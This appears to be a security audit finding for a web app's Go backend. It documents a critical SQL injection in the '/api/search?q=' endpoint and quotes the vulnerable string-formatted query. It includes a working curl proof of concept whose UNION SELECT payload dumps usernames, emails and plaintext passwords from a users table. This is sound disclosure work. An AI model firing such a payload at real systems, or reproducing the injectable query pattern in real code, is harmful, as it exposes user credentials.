# C2 — SQL Injection in `GET /api/search?q=` (V02)

**Severity:** Critical  
**CWE:** CWE-89 | **OWASP:** A03:2021  
**Status:** Confirmed (cold-verified)  
**Source draft:** `piolium/findings-draft/p7-002-v02-sqli-search.md`

## Summary

The `q` query parameter in `GET /api/search?q=` is interpolated **twice** into a SQL LIKE pattern via `fmt.Sprintf`. UNION-based SQLi yields full database read.

## Vulnerable Code

`handlers/menu.go::SearchMenu` (line ~76):

```go
q := r.URL.Query().Get("q")
query := fmt.Sprintf("SELECT id, name, description, price, category, image_url, available FROM menu_items WHERE name LIKE '%%%s%%' OR description LIKE '%%%s%%'", q, q)
rows, err = db.QueryRows(query)
```

## Impact

Same as C1 — unauthenticated full read of the SQLite database.

## PoC

```bash
curl "http://localhost:4443/api/search?q=%27%20UNION%20SELECT%201,username,email,password,category,image_url,1%20FROM%20users--"
```

Response: array of menu-shaped rows, fields populated with `users` columns including plaintext passwords.

## Cold Verification

Re-read source: `q` interpolated twice into LIKE patterns with `%%` wrappers. Both occurrences use the same untrusted `q`. Reachable on public `:4443` without authentication.
